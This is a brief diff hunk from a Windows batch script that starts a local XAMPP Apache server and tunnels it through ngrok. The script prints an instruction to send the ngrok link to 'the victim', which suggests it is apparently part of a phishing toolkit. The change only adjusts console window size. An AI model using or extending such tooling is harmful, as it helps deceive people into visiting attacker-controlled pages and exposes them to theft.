@@ -424,7 +424,7 @@ cd %path_o%
 color 0a
 echo Send Ngrok Link To The Victim(Eg : http://***.ngrok.io or https://***.ngrok.io).
 start cmd /c "@mode con cols=79 lines=20 && C:\xampp\apache_start.bat"
-start cmd /c " && ngrok http 80"
+start cmd /c "@mode con cols=79 lines=20 && ngrok http 80"
 goto a
 
 :a
